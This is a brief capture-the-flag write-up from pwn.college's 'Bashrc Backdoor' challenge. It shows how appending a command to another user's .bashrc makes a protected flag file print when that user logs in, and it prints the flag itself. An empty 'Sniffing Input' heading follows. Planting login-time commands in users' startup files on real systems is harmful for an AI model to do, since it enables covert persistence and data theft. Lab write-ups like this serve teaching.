### Bashrc Backdoor
```pwn.college{UOrjR33aimjURmvTX8HO0oRLMKj.QXxMTM3EDL1gTN0czW}```  

the .bashrc file serves as the startup script.  
In this challenge we can add a line to the .bashrc script which cats the flag file and gives us the flag when the victim logs on.  
```
~$ echo "cat /flag" >> /home/zardus/.bashrc
~$ /challenge/victim
Username: zardus
Password: **********
pwn.college{UOrjR33aimjURmvTX8HO0oRLMKj.QXxMTM3EDL1gTN0czW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

### Sniffing Input
```
